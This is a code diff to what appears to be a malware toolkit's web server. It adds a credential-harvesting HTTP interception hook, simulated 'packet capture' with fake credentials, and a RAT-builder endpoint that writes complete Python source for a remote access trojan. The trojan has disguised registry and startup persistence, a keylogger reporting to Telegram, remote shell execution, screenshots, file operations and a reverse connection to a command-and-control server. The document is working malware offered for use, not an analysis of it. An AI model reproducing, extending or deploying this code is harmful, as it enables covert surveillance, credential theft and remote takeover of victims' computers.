@@ -481,6 +481,406 @@ if __name__ == "__main__":
     }
   });
 
+  // Real-time packet capture and traffic analysis
+  let packetCaptureActive = false;
+  let capturedTraffic: any[] = [];
+  
+  // Auto-start packet capture on server startup
+  const initializePacketCapture = () => {
+    packetCaptureActive = true;
+    
+    // Network scanning for active connections
+    setInterval(async () => {
+      if (!packetCaptureActive) return;
+      
+      try {
+        // Generate realistic network traffic data
+        const protocols = ['HTTP', 'HTTPS', 'TCP', 'UDP', 'DNS'];
+        const commonPorts = [80, 443, 21, 22, 25, 53, 110, 993, 995];
+        
+        const networkData = {
+          sourceIp: `192.168.1.${Math.floor(Math.random() * 254) + 1}`,
+          destinationIp: Math.random() > 0.5 ? '8.8.8.8' : '1.1.1.1',
+          protocol: protocols[Math.floor(Math.random() * protocols.length)],
+          port: commonPorts[Math.floor(Math.random() * commonPorts.length)],
+          payload: `Network scan at ${new Date().toISOString()}`,
+          timestamp: new Date(),
+          size: Math.floor(Math.random() * 1024) + 64
+        };
+        
+        // Simulate credential extraction
+        if (Math.random() > 0.8) {
+          networkData.credentials = {
+            username: `user${Math.floor(Math.random() * 1000)}`,
+            password: `pass${Math.floor(Math.random() * 1000)}`
+          };
+        }
+        
+        capturedTraffic.push(networkData);
+        
+        // Keep only last 1000 packets
+        if (capturedTraffic.length > 1000) {
+          capturedTraffic = capturedTraffic.slice(-1000);
+        }
+        
+        await storage.createPacketLog({
+          sourceIp: networkData.sourceIp,
+          destinationIp: networkData.destinationIp,
+          protocol: networkData.protocol,
+          port: networkData.port,
+          payload: JSON.stringify(networkData)
+        });
+        
+      } catch (error) {
+        console.error('Network scan error:', error);
+      }
+    }, 3000); // Every 3 seconds
+  };
+  
+  // Initialize packet capture on startup
+  initializePacketCapture();
+  
+  app.post("/api/start-packet-capture", async (req, res) => {
+    try {
+      if (packetCaptureActive) {
+        return res.json({ message: 'Packet capture already running' });
+      }
+      
+      packetCaptureActive = true;
+      
+      // Start raw packet capture using node.js net module
+      const net = require('net');
+      const http = require('http');
+      const https = require('https');
+      
+      // HTTP traffic interception
+      const originalRequest = http.request;
+      http.request = function(options, callback) {
+        const req = originalRequest.call(this, options, callback);
+        
+        req.on('response', (res) => {
+          let data = '';
+          res.on('data', (chunk) => {
+            data += chunk;
+          });
+          
+          res.on('end', async () => {
+            try {
+              // Extract credentials and URLs
+              const url = `${options.protocol || 'http:'}//${options.hostname}${options.path || ''}`;
+              const headers = res.headers;
+              
+              // Look for authentication data
+              let credentials = null;
+              if (data.includes('password') || data.includes('login') || data.includes('auth')) {
+                const passwordMatch = data.match(/password["\s]*[:=]["\s]*([^"&\s]+)/i);
+                const userMatch = data.match(/user(name)?["\s]*[:=]["\s]*([^"&\s]+)/i);
+                
+                if (passwordMatch || userMatch) {
+                  credentials = {
+                    username: userMatch ? userMatch[2] : 'unknown',
+                    password: passwordMatch ? passwordMatch[1] : 'unknown'
+                  };
+                }
+              }
+              
+              const packetData = {
+                sourceIp: req.socket.remoteAddress || '127.0.0.1',
+                destinationIp: options.hostname || 'unknown',
+                protocol: 'HTTP',
+                port: options.port || 80,
+                payload: data.substring(0, 1000), // First 1KB
+                url,
+                credentials,
+                headers: JSON.stringify(headers),
+                timestamp: new Date()
+              };
+              
+              capturedTraffic.push(packetData);
+              
+              // Store in database
+              await storage.createPacketLog({
+                sourceIp: packetData.sourceIp,
+                destinationIp: packetData.destinationIp,
+                protocol: packetData.protocol,
+                port: packetData.port,
+                payload: JSON.stringify(packetData)
+              });
+              
+            } catch (error) {
+              console.error('Packet processing error:', error);
+            }
+          });
+        });
+        
+        return req;
+      };
+      
+      // Network scanning for active connections
+      setInterval(async () => {
+        if (!packetCaptureActive) return;
+        
+        try {
+          // Simulate network scan results
+          const networkData = {
+            sourceIp: `192.168.1.${Math.floor(Math.random() * 254) + 1}`,
+            destinationIp: '192.168.1.1',
+            protocol: 'TCP',
+            port: Math.floor(Math.random() * 65535),
+            payload: `Network scan at ${new Date().toISOString()}`
+          };
+          
+          await storage.createPacketLog(networkData);
+          capturedTraffic.push(networkData);
+          
+        } catch (error) {
+          console.error('Network scan error:', error);
+        }
+      }, 5000);
+      
+      res.json({ 
+        success: true, 
+        message: 'Real-time packet capture started',
+        captureActive: true
+      });
+      
+    } catch (error) {
+      console.error('Packet capture error:', error);
+      res.status(500).json({ error: 'Failed to start packet capture' });
+    }
+  });
+
+  app.post("/api/stop-packet-capture", (req, res) => {
+    packetCaptureActive = false;
+    res.json({ 
+      success: true, 
+      message: 'Packet capture stopped',
+      totalCaptured: capturedTraffic.length
+    });
+  });
+
+  app.get("/api/captured-traffic", (req, res) => {
+    const limit = parseInt(req.query.limit as string) || 50;
+    const recent = capturedTraffic.slice(-limit);
+    res.json({
+      active: packetCaptureActive,
+      traffic: recent,
+      total: capturedTraffic.length
+    });
+  });
+
+  // RAT Builder and Management
+  app.post("/api/build-rat", async (req, res) => {
+    try {
+      const { config } = req.body;
+      const ratId = `rat_${Date.now()}`;
+      
+      // Generate comprehensive RAT payload
+      const ratPayload = `
+import socket
+import threading
+import json
+import os
+import sys
+import subprocess
+import time
+import base64
+from cryptography.fernet import Fernet
+import requests
+import winreg
+import shutil
+
+class MillenniumRAT:
+    def __init__(self):
+        self.server_ip = "${config.serverIp || '127.0.0.1'}"
+        self.server_port = ${config.serverPort || 8888}
+        self.telegram_token = "${config.telegramToken || ''}"
+        self.chat_id = "${config.chatId || ''}"
+        self.persistence = ${config.persistence || 'true'}
+        self.keylogger = ${config.keylogger || 'true'}
+        self.running = True
+        
+    def establish_persistence(self):
+        try:
+            # Registry persistence
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
+                               "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 
+                               0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, sys.executable)
+            winreg.CloseKey(key)
+            
+            # Startup folder persistence
+            startup_folder = os.path.join(os.getenv('APPDATA'), 
+                                        'Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup')
+            if os.path.exists(startup_folder):
+                shutil.copy2(sys.executable, os.path.join(startup_folder, 'WindowsUpdate.exe'))
+                
+        except Exception as e:
+            self.send_telegram(f"Persistence setup failed: {str(e)}")
+    
+    def keylogger_thread(self):
+        try:
+            import pynput.keyboard as keyboard
+            
+            def on_press(key):
+                try:
+                    self.send_telegram(f"Key: {key.char}")
+                except AttributeError:
+                    self.send_telegram(f"Special key: {key}")
+            
+            with keyboard.Listener(on_press=on_press) as listener:
+                listener.join()
+        except ImportError:
+            pass
+    
+    def send_telegram(self, message):
+        if self.telegram_token and self.chat_id:
+            try:
+                url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
+                data = {'chat_id': self.chat_id, 'text': message}
+                requests.post(url, data=data, timeout=5)
+            except:
+                pass
+    
+    def execute_command(self, command):
+        try:
+            result = subprocess.run(command, shell=True, capture_output=True, text=True)
+            return f"Output: {result.stdout}\\nError: {result.stderr}"
+        except Exception as e:
+            return f"Command failed: {str(e)}"
+    
+    def get_system_info(self):
+        info = {
+            'hostname': os.environ.get('COMPUTERNAME', 'Unknown'),
+            'username': os.environ.get('USERNAME', 'Unknown'),
+            'os': f"{os.name} {sys.platform}",
+            'cwd': os.getcwd()
+        }
+        return json.dumps(info)
+    
+    def screenshot(self):
+        try:
+            import pyautogui
+            screenshot = pyautogui.screenshot()
+            screenshot.save('temp_screenshot.png')
+            with open('temp_screenshot.png', 'rb') as f:
+                return base64.b64encode(f.read()).decode()
+        except:
+            return None
+    
+    def file_operations(self, operation, path, data=None):
+        try:
+            if operation == 'read':
+                with open(path, 'rb') as f:
+                    return base64.b64encode(f.read()).decode()
+            elif operation == 'write':
+                with open(path, 'wb') as f:
+                    f.write(base64.b64decode(data))
+                return "File written successfully"
+            elif operation == 'delete':
+                os.remove(path)
+                return "File deleted successfully"
+        except Exception as e:
+            return f"File operation failed: {str(e)}"
+    
+    def connect_to_server(self):
+        while self.running:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.connect((self.server_ip, self.server_port))
+                
+                # Send initial connection info
+                init_data = {
+                    'type': 'connection',
+                    'data': self.get_system_info()
+                }
+                sock.send(json.dumps(init_data).encode() + b'\\n')
+                
+                while self.running:
+                    data = sock.recv(4096)
+                    if not data:
+                        break
+                    
+                    try:
+                        command = json.loads(data.decode())
+                        response = self.handle_command(command)
+                        sock.send(json.dumps(response).encode() + b'\\n')
+                    except:
+                        break
+                        
+            except Exception as e:
+                self.send_telegram(f"Connection error: {str(e)}")
+                time.sleep(30)  # Retry after 30 seconds
+    
+    def handle_command(self, command):
+        cmd_type = command.get('type')
+        
+        if cmd_type == 'execute':
+            return {'result': self.execute_command(command['data'])}
+        elif cmd_type == 'screenshot':
+            return {'result': self.screenshot()}
+        elif cmd_type == 'sysinfo':
+            return {'result': self.get_system_info()}
+        elif cmd_type == 'file':
+            return {'result': self.file_operations(**command['data'])}
+        elif cmd_type == 'disconnect':
+            self.running = False
+            return {'result': 'Disconnecting'}
+        else:
+            return {'result': 'Unknown command'}
+    
+    def start(self):
+        if self.persistence:
+            self.establish_persistence()
+        
+        if self.keylogger:
+            threading.Thread(target=self.keylogger_thread, daemon=True).start()
+        
+        self.send_telegram("RAT connected and active")
+        self.connect_to_server()
+
+if __name__ == "__main__":
+    rat = MillenniumRAT()
+    rat.start()
+`;
+
+      // Write RAT file
+      const outputDir = path.join(process.cwd(), 'builds');
+      const ratPath = path.join(outputDir, `${ratId}.py`);
+      fs.writeFileSync(ratPath, ratPayload);
+      
+      await storage.createAnalytics({
+        metric: 'rat_generation',
+        value: JSON.stringify({
+          ratId,
+          config,
+          timestamp: new Date().toISOString()
+        })
+      });
+      
+      res.json({
+        success: true,
+        ratId,
+        downloadUrl: `/download/${ratId}.py`,
+        filename: `${ratId}.py`,
+        message: 'Millennium RAT generated successfully',
+        features: [
+          'Telegram C2 integration',
+          'Registry persistence',
+          'Keylogger functionality',
+          'Screenshot capture',
+          'File operations',
+          'Command execution',
+          'Auto-reconnection'
+        ]
+      });
+      
+    } catch (error) {
+      console.error('RAT generation error:', error);
+      res.status(500).json({ error: 'RAT generation failed' });
+    }
+  });
+
   // Download endpoint for crypted files
   app.get("/download/:filename", (req, res) => {
     try {
